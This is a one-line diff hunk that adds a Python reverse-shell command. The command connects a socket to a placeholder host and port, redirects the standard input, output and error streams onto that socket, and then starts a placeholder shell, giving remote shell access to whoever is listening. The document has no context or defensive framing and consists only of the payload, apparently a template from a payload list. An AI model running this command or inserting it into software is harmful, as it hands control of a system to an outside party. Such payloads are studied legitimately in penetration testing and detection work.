@@ -1,0 +1,1 @@
+python -c 'import socket,os,subprocess; sock = socket.socket(); sock.connect(("*\host*",*\port*)); [os.dup2(sock.fileno(),fd) for fd in (0,1,2)]; subprocess.call(["*\shell*"])'
